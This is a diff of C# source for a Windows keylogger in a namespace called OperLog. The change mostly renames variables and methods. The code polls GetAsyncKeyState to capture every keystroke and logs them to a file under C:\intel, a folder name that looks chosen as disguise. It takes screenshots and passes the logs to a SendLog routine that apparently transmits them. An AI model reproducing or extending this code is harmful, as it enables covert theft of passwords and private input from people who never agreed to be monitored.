@@ -11,7 +11,7 @@ namespace OperLog
 {
     class Log
     {
-        public static int nsymb = 20;
+        public static int Nsymb = 20;
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
         //[STAThread]
@@ -21,8 +21,8 @@ namespace OperLog
             this._bw.DoWork += Key_Log;
             this._bw.RunWorkerAsync();
         }
-        const string picpath = @"C:\intel\icon.png";
-        const string logpath = @"C:\intel\log.log";
+        const string Picpath = @"C:\intel\icon.png";
+        const string Logpath = @"C:\intel\log.log";
         public void Key_Log(object sender, DoWorkEventArgs e)
         { 
             string buf = "";
@@ -33,10 +33,10 @@ namespace OperLog
                     int state = GetAsyncKeyState(i);
                     if (state != 0)
                     {
-                        buf += GetKyesID((Keys)i);
-                        if (buf.Length > nsymb) {
+                        buf += GetKyesId((Keys)i);
+                        if (buf.Length > Nsymb) {
                             // TODO: если скрин не получилось сделать возвращать в лог сообщение о неудаче
-                            MakeLog(picpath,logpath,buf);
+                            MakeLog(Picpath,Logpath,buf);
                             buf = "";
                         }
                     }
@@ -57,7 +57,7 @@ namespace OperLog
 
        static void AddText(string text, string path)
         {
-            File.AppendAllText(logpath, text);
+            File.AppendAllText(Logpath, text);
         }
 
        static void MakeLog(string picpath, string logpath, string text)
@@ -68,42 +68,42 @@ namespace OperLog
            m.SendLog(text,picpath);
        }
 
-       static string GetKyesID(Keys keyID)
+       static string GetKyesId(Keys keyid)
        {
            string key = "";
-           if (keyID == Keys.D0) { key = "0"; return key; }
-           if (keyID == Keys.D1) { key = "1"; return key; }
-           if (keyID == Keys.D2) { key = "2"; return key; }
-           if (keyID == Keys.D3) { key = "3"; return key; }
-           if (keyID == Keys.D4) { key = "4"; return key; }
-           if (keyID == Keys.D5) { key = "5"; return key; }
-           if (keyID == Keys.D6) { key = "6"; return key; }
-           if (keyID == Keys.D7) { key = "7"; return key; }
-           if (keyID == Keys.D8) { key = "8"; return key; }
-           if (keyID == Keys.D9) { key = "9"; return key; }
-           if (keyID == Keys.Space) { key = " "; return key;}
-           if (keyID == Keys.Escape) { key = "ESC"; return key; }
-           if (keyID == Keys.Back) { key = "<-"; return key; }
-           if (keyID == Keys.Enter) { key = " NL"; return key; }
-           if (keyID == Keys.Capital) { key = "CAPS"; return key; }
-           if (keyID == Keys.Tab) { key = "TAB"; return key; }
-           if (keyID == Keys.Right || keyID == Keys.Left || keyID == Keys.Down || keyID == Keys.Up) { key = ""; return key; }
-           if (keyID == Keys.Menu || keyID == Keys.LMenu || keyID == Keys.RMenu) { key = "ALT"; return key; }
-           if (keyID == Keys.Oemplus) { key = "+"; return key; }
-           if (keyID == Keys.OemPeriod) { key = "."; return key; }
-           if (keyID == Keys.OemMinus) { key = "-"; return key; }
-           if (keyID == Keys.Oem5) { key = "/"; return key; }
-           if (keyID == Keys.ShiftKey || keyID == Keys.LShiftKey || keyID == Keys.RShiftKey) { key = "SHIFT"; return key; }
-           if (keyID == Keys.ControlKey || keyID == Keys.LControlKey || keyID == Keys.RControlKey) { key = "CTRL"; return key; }
-           if (keyID == Keys.Oem1) { key = ";"; return key; }
-           if (keyID == Keys.LButton || keyID == Keys.RButton || keyID == Keys.MButton) { key = ""; return key; }
-           if (keyID.ToString().Length == 1)
+           if (keyid == Keys.D0) { key = "0"; return key; }
+           if (keyid == Keys.D1) { key = "1"; return key; }
+           if (keyid == Keys.D2) { key = "2"; return key; }
+           if (keyid == Keys.D3) { key = "3"; return key; }
+           if (keyid == Keys.D4) { key = "4"; return key; }
+           if (keyid == Keys.D5) { key = "5"; return key; }
+           if (keyid == Keys.D6) { key = "6"; return key; }
+           if (keyid == Keys.D7) { key = "7"; return key; }
+           if (keyid == Keys.D8) { key = "8"; return key; }
+           if (keyid == Keys.D9) { key = "9"; return key; }
+           if (keyid == Keys.Space) { key = " "; return key;}
+           if (keyid == Keys.Escape) { key = "ESC"; return key; }
+           if (keyid == Keys.Back) { key = "<-"; return key; }
+           if (keyid == Keys.Enter) { key = " NL"; return key; }
+           if (keyid == Keys.Capital) { key = "CAPS"; return key; }
+           if (keyid == Keys.Tab) { key = "TAB"; return key; }
+           if (keyid == Keys.Right || keyid == Keys.Left || keyid == Keys.Down || keyid == Keys.Up) { key = ""; return key; }
+           if (keyid == Keys.Menu || keyid == Keys.LMenu || keyid == Keys.RMenu) { key = "ALT"; return key; }
+           if (keyid == Keys.Oemplus) { key = "+"; return key; }
+           if (keyid == Keys.OemPeriod) { key = "."; return key; }
+           if (keyid == Keys.OemMinus) { key = "-"; return key; }
+           if (keyid == Keys.Oem5) { key = "/"; return key; }
+           if (keyid == Keys.ShiftKey || keyid == Keys.LShiftKey || keyid == Keys.RShiftKey) { key = "SHIFT"; return key; }
+           if (keyid == Keys.ControlKey || keyid == Keys.LControlKey || keyid == Keys.RControlKey) { key = "CTRL"; return key; }
+           if (keyid == Keys.Oem1) { key = ";"; return key; }
+           if (keyid == Keys.LButton || keyid == Keys.RButton || keyid == Keys.MButton) { key = ""; return key; }
+           if (keyid.ToString().Length == 1)
            {
-               key = keyID.ToString();
+               key = keyid.ToString();
            }
            else
            {
-               key = $"<{keyID.ToString()}>";
+               key = $"<{keyid.ToString()}>";
            }
            return key;
        }
